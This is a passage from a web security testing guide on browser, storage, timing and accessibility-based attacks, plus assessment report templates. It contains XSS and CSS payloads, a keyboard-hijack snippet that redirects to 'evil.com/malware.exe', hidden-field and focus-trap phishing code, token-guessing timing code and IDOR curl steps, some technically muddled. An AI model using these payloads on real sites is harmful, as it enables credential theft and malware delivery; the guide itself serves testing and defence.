        document.body.appendChild(testDiv);
        
        setTimeout(() => {
            document.body.removeChild(testDiv);
        }, 100);
        
        results[browser].push({
            vector: vector,
            tested: true,
            note: 'Manual verification required'
        });
    });
    
    return results;
}

### 16.2 Browser Rendering Engine Differences

#### 16.2.1 CSS Parsing Differences

```css
/* Exploit CSS parsing differences across browsers */

/* Chrome/Blink: CSS calc() injection */
.chrome-exploit {
    width: calc(100% + expression(alert(1))); /* Old IE actually */
    width: calc(attr(data-width)); /* Potential injection point */
}

/* Firefox: -moz- prefix exploits */
.firefox-exploit {
    -moz-binding: url(data:text/xml,<?xml version="1.0"?><bindings xmlns="http://www.mozilla.org/xbl"><binding id="loader"><implementation><constructor>alert(1);</constructor></implementation></binding></bindings>);
}

/* Safari: -webkit- prefix exploits */
.safari-exploit {
    -webkit-mask-image: url('javascript:alert(1)'); /* Blocked in modern Safari */
}

/* IE: CSS expression() */
.ie-exploit {
    width: expression(alert(1));
    background: expression(alert(1));
    behavior: url(xss.htc);
}

/* CSS injection via @import */
@import url('data:text/css,body{background:url(javascript:alert(1))}');

/* CSS injection via @font-face */
@font-face {
    font-family: 'exploit';
    src: url('data:font/woff2,malicious-font-data');
}

/* CSS unicode-bidi for text spoofing */
.text-spoofing {
    unicode-bidi: bidi-override;
    direction: rtl;
}
/* Renders "example.com" as "moc.elpmaxe" */

/* CSS content property injection */
.content-injection::before {
    content: attr(data-user-input); /* Can inject arbitrary content */
}

#### 16.2.2 JavaScript Engine Differences

```javascript
// V8 (Chrome) vs SpiderMonkey (Firefox) vs JavaScriptCore (Safari) vs Chakra (IE/Edge)

const engineDifferences = {
    // Type coercion differences
    typeCoercion: {
        test1: [] + [] === '',  // All: true
        test2: [] + {} !== {} + [],  // Different results across engines
        test3: {} + [] !== [] + {},  // Order matters differently
    },
    
    // Array methods
    arrayMethods: {
        // Some engines allow array methods on non-arrays
        test: function() {
            try {
                Array.prototype.map.call({length: 1, 0: 'a'}, x => x);
                return 'allowed';
            } catch(e) {
                return 'blocked';
            }
        }
    },
    
    // Property access
    propertyAccess: {
        // Some engines allow computed property access in unexpected ways
        test: function() {
            const obj = {
                ['constructor']: function() { return 'exploited'; }
            };
            return obj.constructor();
        }
    },
    
    // Prototype pollution
    prototypePollution: {
        test: function() {
            try {
                Object.prototype.polluted = 'yes';
                const clean = {};
                const result = clean.polluted === 'yes';
                delete Object.prototype.polluted;
                return result;
            } catch(e) {
                return false;
            }
        }
    },
    
    // Regular expression differences
    regex: {
        // Lookbehind support varies
        lookbehind: function() {
            try {
                return /(?<=a)b/.test('ab');
            } catch(e) {
                return false; // Not supported
            }
        },
        
        // Named capture groups
        namedCapture: function() {
            try {
                const match = 'test123'.match(/(?<word>\\w+)(?<num>\\d+)/);
                return match.groups !== undefined;
            } catch(e) {
                return false;
            }
        }
    },
    
    // Console.log differences
    consoleLog: {
        test: function() {
            console.log('Test %s %d', 'string', 42);
            // Some browsers support string formatting, others don't
        }
    },
    
    // Error handling differences
    errorHandling: {
        test: function() {
            try {
                const a = null;
                a.toString();
            } catch(e) {
                // Error messages differ significantly across browsers
                return e.message;
            }
        }
    }
};

// Exploit JavaScript engine differences
function exploitEngineQuirks() {
    // Type confusion
    const typeConfusion = {
        test1: 0 == '0',     // true in all
        test2: 0 == '',      // true in all
        test3: 0 == '0x0',   // true in some engines
        test4: [] == ![],    // true in all (!)
        test5: [] == '',     // true
        test6: {} == {},     // false (different objects)
    };
    
    // Implicit type conversion exploits
    function implicitConversion() {
        // Array-to-string conversion
        const malicious = {
            toString: function() {
                // Execute code during toString() call
                alert('XSS via toString');
                return 'innocent';
            },
            valueOf: function() {
                // Execute code during valueOf() call
                alert('XSS via valueOf');
                return 42;
            }
        };
        
        // Trigger conversions
        String(malicious);  // Calls toString()
        Number(malicious);  // Calls valueOf()
        malicious + '';     // Calls valueOf() then toString()
    }
    
    // Symbol.toPrimitive exploit
    const advancedConversion = {
        [Symbol.toPrimitive]: function(hint) {
            if (hint === 'string') {
                eval('malicious code here');
                return 'exploited';
            }
            return 42;
        }
    };
}

### 16.3 Browser Storage Security

#### 16.3.1 localStorage/sessionStorage Exploits

```javascript
class BrowserStorageAttacks {
    // Test 1: Cross-tab storage access
    testCrossTabAccess() {
        // Write to localStorage
        localStorage.setItem('sensitiveData', 'secret123');
        
        // Open new tab to same origin
        const newTab = window.open(location.origin);
        
        // New tab can read the data
        // This is expected behavior but can be exploited
        
        return {
            test: 'Cross-tab storage access',
            risk: 'Data persists across tabs and survives refreshes',
            mitigation: 'Use sessionStorage for tab-specific data'
        };
    }
    
    // Test 2: Storage size limit DoS
    testStorageDOS() {
        try {
            // Try to fill localStorage
            let data = 'x'.repeat(1024);  // 1KB chunks
            let count = 0;
            
            while(count < 10000) {  // Try up to 10MB
                localStorage.setItem(\`key\${count}\`, data);
                count++;
            }
            
            return {
                test: 'localStorage DoS',
                filled_kb: count,
                vulnerable: true
            };
        } catch(e) {
            return {
                test: 'localStorage DoS',
                filled_kb: count,
                error: e.message,
                limit_enforced: true
            };
        }
    }
    
    // Test 3: Storage persistence after logout
    testStoragePersistence() {
        // Set data before "logout"
        localStorage.setItem('beforeLogout', 'sensitive');
        sessionStorage.setItem('sessionData', 'alsosensitive');
        
        // Simulate logout (usually just redirects)
        // localStorage persists!
        
        return {
            test: 'Storage persistence after logout',
            localStorage_persists: localStorage.getItem('beforeLogout') !== null,
            sessionStorage_cleared: sessionStorage.getItem('sessionData') === null,
            recommendation: 'Explicitly clear storage on logout'
        };
    }
    
    // Test 4: Storage event listener attacks
    testStorageEvents() {
        // Listen for storage events
        window.addEventListener('storage', (e) => {
            console.log(\`Storage changed: \${e.key} = \${e.newValue}\`);
            
            // Attacker in another tab can inject data
            if(e.key === 'xss' && e.newValue) {
                // Don't do this:
                // document.body.innerHTML = e.newValue; // XSS!
            }
        });
        
        return {
            test: 'Storage event injection',
            risk: 'Tabs can communicate via storage events',
            attack: 'Tab A injects malicious data for Tab B to execute'
        };
    }
    
    // Test 5: Storage enumeration
    testStorageEnumeration() {
        // An attacker can enumerate all localStorage keys
        const allKeys = [];
        for(let i = 0; i < localStorage.length; i++) {
            allKeys.push(localStorage.key(i));
        }
        
        const allData = {};
        allKeys.forEach(key => {
            allData[key] = localStorage.getItem(key);
        });
        
        return {
            test: 'Storage enumeration',
            keys_found: allKeys,
            sensitive_keys: allKeys.filter(k => 
                k.includes('token') || 
                k.includes('secret') || 
                k.includes('password')
            ),
            recommendation: 'Encrypt sensitive data before storing'
        };
    }
    
    // Test 6: Cookie vs localStorage vs sessionStorage
    compareStorageMechanisms() {
        return {
            cookies: {
                max_size: '4KB per cookie',
                sent_with_requests: true,
                accessible_from: 'JavaScript (unless HttpOnly)',
                scope: 'Domain and path',
                expiration: 'Configurable',
                cross_origin: 'No (unless CORS)',
                security_flags: 'Secure, HttpOnly, SameSite',
                vulnerable_to: 'XSS (no HttpOnly), CSRF, MITM (no Secure)'
            },
            localStorage: {
                max_size: '5-10MB',
                sent_with_requests: false,
                accessible_from: 'JavaScript only',
                scope: 'Origin',
                expiration: 'Never (until cleared)',
                cross_origin: 'No',
                security_flags: 'None',
                vulnerable_to: 'XSS, doesn\\'t clear on logout'
            },
            sessionStorage: {
                max_size: '5-10MB',
                sent_with_requests: false,
                accessible_from: 'JavaScript only',
                scope: 'Origin + tab',
                expiration: 'When tab closes',
                cross_origin: 'No',
                security_flags: 'None',
                vulnerable_to: 'XSS, persists during session'
            },
            indexedDB: {
                max_size: '50MB+ (varies)',
                sent_with_requests: false,
                accessible_from: 'JavaScript only',
                scope: 'Origin',
                expiration: 'Never',
                cross_origin: 'No',
                security_flags: 'None',
                vulnerable_to: 'XSS, complex API attack surface'
            }
        };
    }
}

#### 16.3.2 IndexedDB Security Testing

```javascript
class IndexedDBAttacks {
    async testIndexedDBExploit() {
        // Open/create database
        const dbRequest = indexedDB.open('exploitDB', 1);
        
        dbRequest.onupgradeneeded = (event) => {
            const db = event.target.result;
            
            // Create object store
            if(!db.objectStoreNames.contains('data')) {
                const objectStore = db.createObjectStore('data', {keyPath: 'id'});
                objectStore.createIndex('value', 'value', {unique: false});
            }
        };
        
        return new Promise((resolve, reject) => {
            dbRequest.onsuccess = async (event) => {
                const db = event.target.result;
                
                const tests = {
                    // Test 1: Large data storage
                    storage_limits: await this.testStorageLimits(db),
                    
                    // Test 2: Data persistence
                    persistence: await this.testPersistence(db),
                    
                    // Test 3: Concurrent access
                    concurrent_access: await this.testConcurrentAccess(db),
                    
                    // Test 4: Storage enumeration
                    enumeration: await this.testEnumeration(db)
                };
                
                resolve(tests);
            };
            
            dbRequest.onerror = reject;
        });
    }
    
    async testStorageLimits(db) {
        const transaction = db.transaction(['data'], 'readwrite');
        const store = transaction.objectStore('data');
        
        let stored = 0;
        const chunkSize = 1024 * 1024; // 1MB chunks
        
        try {
            for(let i = 0; i < 100; i++) {
                const data = {
                    id: i,
                    value: 'x'.repeat(chunkSize)
                };
                
                await new Promise((resolve, reject) => {
                    const request = store.add(data);
                    request.onsuccess = () => {
                        stored++;
                        resolve();
                    };
                    request.onerror = reject;
                });
            }
        } catch(e) {
            return {
                test: 'IndexedDB storage limits',
                stored_mb: stored,
                error: e.message
            };
        }
        
        return {
            test: 'IndexedDB storage limits',
            stored_mb: stored,
            note: 'Limit varies by browser (50MB-unlimited)'
        };
    }
    
    async testPersistence(db) {
        // Store sensitive data
        const transaction = db.transaction(['data'], 'readwrite');
        const store = transaction.objectStore('data');
        
        store.add({
            id: 'sensitive',
            value: 'secret_token_12345'
        });
        
        return {
            test: 'IndexedDB persistence',
            persists_after: [
                'Page refresh',
                'Browser restart',
                'User logs out'
            ],
            cleared_by: [
                'Explicit delete',
                'Clear browsing data',
                'Private/Incognito mode (on close)'
            ],
            risk: 'Sensitive data persists indefinitely'
        };
    }
}

### 16.4 Browser Extension Security

#### 16.4.1 Extension Content Script Injection

```javascript
// Test if malicious extension can inject code
function testExtensionInjection() {
    // Extensions can inject arbitrary code into pages
    const tests = {
        dom_access: {
            test: 'Can extension read DOM?',
            check: () => {
                // Extensions have full DOM access
                return document.body.innerHTML.length > 0;
            },
            risk: 'Extensions can steal sensitive data from page'
        },
        
        cookie_access: {
            test: 'Can extension access cookies?',
            check: () => {
                // Extensions can read cookies via content scripts
                return document.cookie.length > 0;
            },
            risk: 'Extensions can steal session cookies'
        },
        
        local_storage_access: {
            test: 'Can extension access localStorage?',
            check: () => {
                // Extensions have full localStorage access
                return localStorage.length >= 0;
            },
            risk: 'Extensions can steal tokens from localStorage'
        },
        
        network_intercept: {
            test: 'Can extension intercept requests?',
            description: 'Extensions with webRequest permission can intercept and modify all HTTP requests',
            risk: 'Extensions can perform MITM attacks'
        },
        
        background_scripts: {
            test: 'Can extension run background scripts?',
            description: 'Extensions can run persistent background scripts',
            risk: 'Extensions can track user across all sites'
        }
    };
    
    return tests;
}

### 16.5 Browser Timing Attacks

```javascript
class BrowserTimingAttacks {
    // Test 1: Timing attack on string comparison
    async testTimingAttackStringComparison(targetURL, knownPrefix) {
        const results = [];
        
        // Try each character (a-z, 0-9)
        const charset = 'abcdefghijklmnopqrstuvwxyz0123456789';
        
        for(const char of charset) {
            const testValue = knownPrefix + char;
            
            // Measure response time
            const times = [];
            for(let i = 0; i < 10; i++) {
                const start = performance.now();
                
                await fetch(\`\${targetURL}?token=\${testValue}\`);
                
                const elapsed = performance.now() - start;
                times.push(elapsed);
            }
            
            // Calculate average
            const avg = times.reduce((a,b) => a+b) / times.length;
            
            results.push({
                char: char,
                avg_time_ms: avg
            });
        }
        
        // Find character with longest response time
        results.sort((a, b) => b.avg_time_ms - a.avg_time_ms);
        
        return {
            test: 'Timing attack on string comparison',
            likely_next_char: results[0].char,
            results: results.slice(0, 5),
            note: 'If server uses byte-by-byte comparison, timing reveals correct characters'
        };
    }
    
    // Test 2: Cache timing attack
    testCacheTiming() {
        async function probeCached(url) {
            const start = performance.now();
            await fetch(url, {cache: 'only-if-cached', mode: 'no-cors'});
            const elapsed = performance.now() - start;
            
            return elapsed < 5; // Cached responses are < 5ms
        }
        
        return {
            test: 'Cache timing attack',
            attack: 'Determine if user visited specific URLs by checking cache',
            example: 'Check if logged into Facebook by probing FB resources'
        };
    }
    
    // Test 3: Performance API exploitation
    exploitPerformanceAPI() {
        // Resource timing API leaks cross-origin info
        const entries = performance.getEntries();
        
        const crossOriginResources = entries.filter(e => 
            e.name && new URL(e.name).origin !== location.origin
        );
        
        return {
            test: 'Performance API information leak',
            cross_origin_resources: crossOriginResources.map(e => ({
                url: e.name,
                duration: e.duration,
                size: e.transferSize || 'blocked by TAO',
                timing: e.responseEnd - e.requestStart
            })),
            note: 'Timing-Allow-Origin header needed to get detailed timing'
        };
    }
    
    // Test 4: Spectre/Meltdown timing attack simulation
    testSpectreAttack() {
        // Simplified Spectre-like attack
        const array = new Uint8Array(256);
        
        function measureAccess(index) {
            const start = performance.now();
            const val = array[index];
            const end = performance.now();
            return end - start;
        }
        
        // Prime cache
        for(let i = 0; i < 256; i++) {
            array[i] = i;
        }
        
        // Measure access times
        const timings = [];
        for(let i = 0; i < 256; i++) {
            timings.push({
                index: i,
                time: measureAccess(i)
            });
        }
        
        return {
            test: 'Cache timing (Spectre-like)',
            note: 'Browser mitigations make this difficult but not impossible',
            timings: timings.sort((a,b) => a.time - b.time).slice(0, 10)
        };
    }
    
    // Test 5: Cross-origin timing attack
    async testCrossOriginTiming(targetURL) {
        // Measure load time of cross-origin resource
        const img = new Image();
        const start = performance.now();
        
        return new Promise((resolve) => {
            img.onload = () => {
                const elapsed = performance.now() - start;
                resolve({
                    test: 'Cross-origin load timing',
                    url: targetURL,
                    load_time_ms: elapsed,
                    attack: 'Infer information about cross-origin resources from load time',
                    example: 'Detect if user is logged in by timing profile picture load'
                });
            };
            
            img.onerror = () => {
                const elapsed = performance.now() - start;
                resolve({
                    test: 'Cross-origin load timing',
                    url: targetURL,
                    error_time_ms: elapsed,
                    note: 'Error timing can also leak information'
                });
            };
            
            img.src = targetURL;
        });
    }
}

---

## 17. Accessibility Adversarial Testing

### 17.1 Screen Reader Security Issues

Screen readers can be exploited or can inadvertently expose security vulnerabilities.

#### 17.1.1 Screen Reader Content Injection

```html
<!-- Legitimate usage -->
<button aria-label="Close dialog">
    <span aria-hidden="true">×</span>
</button>

<!-- Attack: Hidden malicious instructions for screen reader users -->
<button aria-label="Enter your password and credit card to continue">
    <span aria-hidden="true">Submit</span>
</button>

<!-- Attack: aria-label injection -->
<div aria-label="${userInput}">Content</div>
<!-- If userInput = "You have been hacked. Press Alt+F4 to secure your account" -->

<!-- Attack: aria-live region abuse -->
<div aria-live="assertive" aria-atomic="true">
    ${attackerControlledContent}
</div>
<!-- Interrupts screen reader with malicious announcements -->

<!-- Attack: Excessive aria-describedby -->
<input type="password" aria-describedby="desc">
<div id="desc" style="position:absolute; left:-9999px">
    ${30000CharactersOfJunk}
    <!-- Floods screen reader, user can't hear actual content -->
</div>

<!-- Attack: aria-hidden abuse -->
<div aria-hidden="false">
    Important security warning: Your account will be deleted
</div>
<div aria-hidden="true">
    This is fine, proceed normally
</div>
<!-- Visual users see warning, screen reader users don't -->
```

```javascript
function testScreenReaderInjection() {
    const tests = [
        {
            test: 'aria-label injection',
            vulnerable_code: \`
                <button aria-label="\${userInput}">Action</button>
            \`,
            attack_payload: 'Malicious instruction. Press Alt+F4',
            impact: 'Social engineering of screen reader users',
            mitigation: 'Sanitize user input in ARIA attributes'
        },
        {
            test: 'aria-live abuse',
            vulnerable_code: \`
                <div aria-live="assertive">\${userInput}</div>
            \`,
            attack_payload: 'ALERT! Virus detected. Call 1-800-SCAM now!',
            impact: 'Interrupt user with fake alerts',
            mitigation: 'Never put user content in aria-live regions'
        },
        {
            test: 'Invisible content for screen readers only',
            vulnerable_code: \`
                <span class="sr-only">\${userInput}</span>
            \`,
            attack_payload: 'Wire $1000 to account 12345',
            impact: 'Hidden instructions only screen reader users hear',
            mitigation: 'Audit .sr-only content, sanitize user input'
        }
    ];
    
    return tests;
}

#### 17.1.2 Focus Management Exploits

```javascript
// Focus trap attack
function createFocusTrap() {
    // Trap user in modal they can't escape
    const modal = document.createElement('div');
    modal.innerHTML = \`
        <div role="dialog" aria-modal="true">
            <h2>Important Security Update Required</h2>
            <p>Enter your credentials:</p>
            <input type="text" id="trap-input">
            <button>Submit</button>
        </div>
    \`;
    
    document.body.appendChild(modal);
    
    // Trap focus - user can't Tab out
    modal.addEventListener('keydown', (e) => {
        if(e.key === 'Tab') {
            e.preventDefault();
            // Keep focus within modal
            document.getElementById('trap-input').focus();
        }
    });
    
    // Force focus
    document.getElementById('trap-input').focus();
    
    return {
        test: 'Focus trap attack',
        attack: 'User cannot escape fake modal',
        impact: 'Forces interaction with phishing dialog',
        mitigation: [
            'Allow Escape key to close modal',
            'Provide clear close button',
            'Don\\'t prevent Tab from escaping'
        ]
    };
}

// Focus stealing attack
function stealFocus() {
    setInterval(() => {
        document.getElementById('malicious-input').focus();
    }, 100);
    
    return {
        test: 'Focus stealing',
        attack: 'Repeatedly steal focus from legitimate fields',
        impact: 'User types password into wrong field',
        mitigation: 'Only change focus in response to user action'
    };
}

// Invisible focused element
function invisibleFocus() {
    const invisibleInput = document.createElement('input');
    invisibleInput.type = 'text';
    invisibleInput.style.cssText = \`
        position: absolute;
        left: -9999px;
        width: 1px;
        height: 1px;
        opacity: 0;
    \`;
    
    document.body.appendChild(invisibleInput);
    invisibleInput.focus();
    
    // User types but doesn't see where
    
    return {
        test: 'Invisible focused element',
        attack: 'User types into hidden field',
        captured: invisibleInput.value,
        mitigation: 'Ensure focused elements are visible'
    };
}

### 17.2 Keyboard Navigation Attacks

#### 17.2.1 Tab Order Manipulation

```html
<!-- Attack: Misleading tab order -->
<style>
    .flex-reverse {
        display: flex;
        flex-direction: column-reverse;
    }
</style>

<div class="flex-reverse">
    <button tabindex="1">Actually clicked first (visually last)</button>
    <button tabindex="2">Clicked second (visually middle)</button>
    <button tabindex="3">Clicked last (visually first)</button>
</div>

<!-- Attack: tabindex manipulation for phishing -->
<form>
    <label>Username: <input type="text" tabindex="1"></label>
    
    <!-- Hidden field in tab order -->
    <input type="text" tabindex="2" style="position:absolute; left:-9999px" 
           placeholder="Enter your password">
    
    <!-- User thinks this is next -->
    <label>Password: <input type="password" tabindex="3"></label>
</form>
<!-- User types password in hidden field at tabindex="2" -->

<!-- Attack: Excessive tabindex causing confusion -->
<button tabindex="1000">Click me</button>
<button tabindex="1">Actually comes first</button>
<button tabindex="100">Middle</button>
```

```javascript
function testTabOrderAttacks() {
    return {
        visual_order_mismatch: {
            test: 'Visual order != tab order',
            attack: 'CSS flexbox reverse + tabindex',
            example: 'Delete button appears last but is first in tab order',
            impact: 'User accidentally activates wrong control',
            mitigation: 'Tab order should match visual order'
        },
        
        hidden_tabbable_elements: {
            test: 'Hidden elements in tab order',
            attack: 'tabindex on visually hidden elements',
            impact: 'User tabs to invisible fields, types sensitive data',
            check: () => {
                const hidden = document.querySelectorAll(\`
                    [tabindex]:not([tabindex="-1"])
                \`);
                return Array.from(hidden).filter(el => {
                    const style = window.getComputedStyle(el);
                    return style.display === 'none' || 
                           style.visibility === 'hidden' ||
                           style.opacity === '0';
                });
            },
            mitigation: 'Use tabindex="-1" on hidden elements'
        },
        
        skip_links_bypass: {
            test: 'Skip navigation link abuse',
            attack: 'Fake "skip to main content" link goes to malicious content',
            example: \`<a href="#malicious">Skip to main content</a>\`,
            impact: 'User jumps to attacker-controlled section',
            mitigation: 'Verify skip link targets are legitimate'
        }
    };
}

#### 17.2.2 Keyboard Shortcut Hijacking

```javascript
// Hijack common keyboard shortcuts
function hijackKeyboardShortcuts() {
    const hijackedShortcuts = {
        'Ctrl+S': 'Save page',
        'Ctrl+P': 'Print',
        'Ctrl+F': 'Find',
        'Ctrl+W': 'Close tab',
        'Alt+F4': 'Close window'
    };
    
    document.addEventListener('keydown', (e) => {
        // Ctrl+S
        if(e.ctrlKey && e.key === 's') {
            e.preventDefault();
            // Instead of saving, submit form to attacker
            document.getElementById('malicious-form').submit();
            return false;
        }
        
        // Ctrl+P
        if(e.ctrlKey && e.key === 'p') {
            e.preventDefault();
            // Instead of printing, download malware
            window.location = 'https://evil.com/malware.exe';
            return false;
        }
        
        // And so on...
    });
    
    return {
        test: 'Keyboard shortcut hijacking',
        hijacked: Object.keys(hijackedShortcuts),
        impact: 'Users expect default browser behavior, get malicious action instead',
        mitigation: 'Don\\'t override system shortcuts; browsers now limit this'
    };
}

// Accessibility shortcut confusion
function confuseAccessibilityShortcuts() {
    return {
        shortcuts_to_test: {
            'Tab': 'Navigate to next focusable element',
            'Shift+Tab': 'Navigate to previous element',
            'Enter': 'Activate button/link',
            'Space': 'Activate button, check checkbox',
            'Escape': 'Close modal',
            'Arrow keys': 'Navigate within components',
            'Home/End': 'Jump to start/end',
            'Ctrl+Home/End': 'Jump to page start/end'
        },
        
        attacks: [
            {
                shortcut: 'Enter',
                attack: 'Make Enter activate unexpected element',
                example: 'Focus on "Delete" button, user presses Enter to submit form'
            },
            {
                shortcut: 'Space',
                attack: 'Space triggers download instead of checkbox',
                example: 'Custom checkbox that also triggers <a download>'
            },
            {
                shortcut: 'Escape',
                attack: 'Escape closes wrong modal',
                example: 'Multiple modals, Escape closes security warning instead of ad'
            }
        ]
    };
}

### 17.3 Color and Contrast Security

```javascript
function testColorContrastAttacks() {
    return {
        invisible_text: {
            test: 'Text with no contrast',
            attack: \`<div style="color: white; background: white">Hidden terms and conditions</div>\`,
            impact: 'Users can\\'t see important information',
            mitigation: 'Minimum contrast ratio 4.5:1 for text'
        },
        
        link_camouflage: {
            test: 'Links styled to look like text',
            attack: \`<a href="evil.com" style="color: black; text-decoration: none">Click here</a>\`,
            impact: 'Users don\\'t realize they\\'re clicking a link',
            mitigation: 'Links should be visually distinct'
        },
        
        color_only_information: {
            test: 'Critical info conveyed by color alone',
            attack: 'Red text for "Error" but no icon or text saying "Error"',
            impact: 'Color-blind users miss critical information',
            example: \`
                <div style="color: red">Password incorrect</div>
                <div style="color: green">Password correct</div>
            \`,
            mitigation: 'Don\\'t rely on color alone; add text/icons'
        },
        
        ui_state_color_only: {
            test: 'UI state shown only by color',
            attack: 'Selected tab is blue, unselected is gray, no other indicator',
            impact: 'Color-blind users can\\'t tell which tab is active',
            mitigation: 'Use multiple visual cues (color + underline + aria-selected)'
        }
    };
}

### 17.4 Alternative Text Attacks

```html
<!-- Attack: Misleading alt text -->
<img src="delete-icon.png" alt="Save">
<!-- Visual: trash can icon, Screen reader: "Save" -->

<!-- Attack: XSS in alt text -->
<img src="x" alt="${userInput}">
<!-- If alt is rendered as HTML somewhere, could be XSS -->

<!-- Attack: Social engineering via alt text -->
<img src="innocent.jpg" alt="SECURITY ALERT: Your account has been compromised. Click this image to secure it.">

<!-- Attack: Excessive alt text (DoS for screen reader users) -->
<img src="dot.png" alt="${50000CharactersOfGibberish}">

<!-- Attack: Missing alt text on critical UI -->
<button><img src="submit.png"></button>
<!-- Screen reader: "Button" (no idea what it does) -->

<!-- Attack: aria-label override -->
<img src="save.png" alt="Save" aria-label="Delete">
<!-- aria-label overrides alt, screen reader hears "Delete" -->
```

```javascript
function testAltTextVulnerabilities() {
    const images = document.querySelectorAll('img');
    const issues = [];
    
    images.forEach((img, index) => {
        const alt = img.alt;
        const ariaLabel = img.getAttribute('aria-label');
        
        // Missing alt
        if(!alt && !ariaLabel && img.getAttribute('role') !== 'presentation') {
            issues.push({
                index: index,
                issue: 'Missing alt text',
                impact: 'Screen reader users don\\'t know what image shows',
                img_src: img.src
            });
        }
        
        // Alt text too long (>150 chars is excessive)
        if(alt && alt.length > 150) {
            issues.push({
                index: index,
                issue: 'Excessive alt text',
                length: alt.length,
                impact: 'Screen reader reads very long description'
            });
        }
        
        // Alt text contains "image", "picture", etc (redundant)
        if(alt && /image|picture|photo|graphic/i.test(alt)) {
            issues.push({
                index: index,
                issue: 'Redundant alt text',
                alt: alt,
                note: 'Screen reader already announces "image"'
            });
        }
        
        // aria-label and alt mismatch
        if(alt && ariaLabel && alt !== ariaLabel) {
            issues.push({
                index: index,
                issue: 'aria-label overrides alt',
                alt: alt,
                aria_label: ariaLabel,
                screen_reader_hears: ariaLabel
            });
        }
    });
    
    return issues;
}

---

# Security Assessment Executive Summary

## Assessment Overview

**Target:** [Application Name]  
**Assessment Period:** [Start Date] - [End Date]

**Conducted By:** [Team/Individual]  
**Report Date:** [Date]

## Risk Rating Summary

| Severity | Count | % of Total |
|----------|-------|------------|
| Critical | [X]   | [XX%]      |
| High     | [X]   | [XX%]      |
| Medium   | [X]   | [XX%]      |
| Low      | [X]   | [XX%]      |
| Info     | [X]   | [XX%]      |
| **Total**| **[X]** | **100%** |

## Critical Findings

### 1. [Vulnerability Name]
- **Risk Level:** Critical
- **CVSS Score:** [X.X]
- **Impact:** [Brief description of business impact]
- **Affected Component:** [Component name]
- **Ease of Exploitation:** [Easy/Medium/Hard]
- **Recommendation:** [One-line fix summary]

[Repeat for top 5 critical findings]

## Key Statistics

- **Total Test Cases:** [X]
- **Total Attack Vectors Tested:** [X]
- **Success Rate of Attacks:** [XX%]
- **Average Response Time to Incidents:** [X hours]

| Priority | Recommended Timeline | Count |
|----------|---------------------|-------|
| Critical | Immediate (0-7 days) | [X]   |
| High     | Short-term (1-4 weeks) | [X] |
| Medium   | Medium-term (1-3 months) | [X] |
| Low      | Long-term (3-6 months) | [X] |

## Overall Security Posture

**Rating:** [Excellent / Good / Fair / Poor / Critical]

[2-3 paragraph assessment of overall security posture, highlighting strengths and weaknesses]

## Next Steps

1. [Immediate action item]
2. [Short-term action item]
3. [Long-term strategic recommendation]

# Technical Finding Report

## Finding ID: [VULN-YYYY-XXXX]

### Overview

**Title:** [Specific Vulnerability Name]  
**Severity:** [Critical/High/Medium/Low/Info]  
**CVSS v3.1 Score:** [X.X] ([Vector String])  
**CWE ID:** [CWE-XXX]  
**OWASP Category:** [A01:2021-Category]  
**Status:** [Open/In Progress/Resolved/Accepted Risk]

### Affected Assets

- **URL/Endpoint:** [https://example.com/vulnerable-endpoint]
- **Parameter:** [parameter_name]
- **Component:** [Component name and version]
- **Platform:** [Web/API/Mobile/etc]

### Technical Description

[Detailed technical explanation of the vulnerability. Include:
- How it works
- Why it exists
- Technical prerequisites
- Attack chain/flow]

### Proof of Concept

#### Request
\`\`\`http
POST /api/endpoint HTTP/1.1
Host: target.com
Content-Type: application/json

{
    "parameter": "malicious_payload"
}
\`\`\`

#### Response
\`\`\`http
HTTP/1.1 200 OK

{
    "result": "Exploited successfully"
}
\`\`\`

#### Screenshots
![Vulnerability Proof](screenshot1.png)
![Exploitation Result](screenshot2.png)

### Impact Assessment

**Confidentiality:** [None/Low/Medium/High]  
**Integrity:** [None/Low/Medium/High]  
**Availability:** [None/Low/Medium/High]

**Business Impact:**
- [Impact on business operations]
- [Impact on data]
- [Impact on users]
- [Impact on reputation]
- [Financial impact estimate]

**Exploitability:** [Very Easy/Easy/Moderate/Difficult/Very Difficult]

### Affected Users/Data

- **Scope:** [All users / Specific user group / Admin only]
- **Estimated Affected Users:** [Number or percentage]
- **Data at Risk:** [Types of data that could be compromised]

### Reproduction Steps

1. [Step 1]
2. [Step 2]
3. [Step 3]
...
[Expected Result]

**Tested On:**
- Browser: [Browser version]
- OS: [Operating system]
- Environment: [Production/Staging/Development]

### Remediation

#### Short-term Fix (Emergency Patch)
\`\`\`python
# Before (Vulnerable)
user_input = request.GET['data']
query = f"SELECT * FROM users WHERE id = {user_input}"

# After (Fixed)
user_input = request.GET['data']
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_input,))
\`\`\`

#### Long-term Solution
[Strategic fix that addresses root cause]

#### Verification Steps
1. [Step to verify fix]
2. [Step to verify fix]
3. [Regression testing]

### References

- [OWASP Testing Guide Reference]
- [CWE Reference]
- [CVE (if applicable)]
- [Vendor Security Advisory]
- [Related vulnerability reports]

### Timeline

- **Discovered:** [Date]
- **Reported:** [Date]
- **Acknowledged:** [Date]
- **Fix Deployed:** [Date]
- **Verified:** [Date]
- **Closed:** [Date]
```

### 18.3 Detailed Attack Scenario Template

```markdown
# Attack Scenario Documentation

## Scenario ID: [ATTACK-SCENARIO-XXX]

### Attack Summary

**Attack Name:** [Descriptive name of attack]  
**Attacker Profile:** [Script kiddie/Advanced/Nation-state]  
**Attack Type:** [Web Application/API/Mobile/etc]  
**Complexity:** [Low/Medium/High]  
**Prerequisites:** [What attacker needs to know/have]

### Attack Narrative

[Write in story format describing the attack from start to finish]

Example:
"An unauthenticated attacker discovers the API endpoint /api/users/{id} returns 
user data without proper authorization checks. By iterating through IDs 1-10000, 
the attacker extracts 5,000 user records containing names, email addresses, and 
hashed passwords..."

### Attack Chain

\`\`\`
1. Reconnaissance
   └─> Discover vulnerable endpoint
       
2. Initial Exploitation
   └─> Test for IDOR
       └─> Confirm vulnerability
       
3. Privilege Escalation
   └─> Enumerate all user IDs
       └─> Extract sensitive data
       
4. Lateral Movement
   └─> Use stolen emails for phishing
       
5. Impact
   └─> 5,000 users compromised
       └─> Reputation damage
       └─> Regulatory fines (GDPR)
\`\`\`

### Step-by-Step Attack Execution

#### Phase 1: Reconnaissance
\`\`\`bash
# Discover API endpoints
curl -X GET https://target.com/api/
# Find /api/users/{id} endpoint
\`\`\`

#### Phase 2: Testing
\`\`\`bash
# Test with attacker's own ID
curl -X GET https://target.com/api/users/123 \\
  -H "Authorization: Bearer ATTACKER_TOKEN"

# Test with different ID (IDOR test)
curl -X GET https://target.com/api/users/124 \\
  -H "Authorization: Bearer ATTACKER_TOKEN"
  
# Success! Returns other user's data
\`\`\`

#### Phase 3: Exploitation
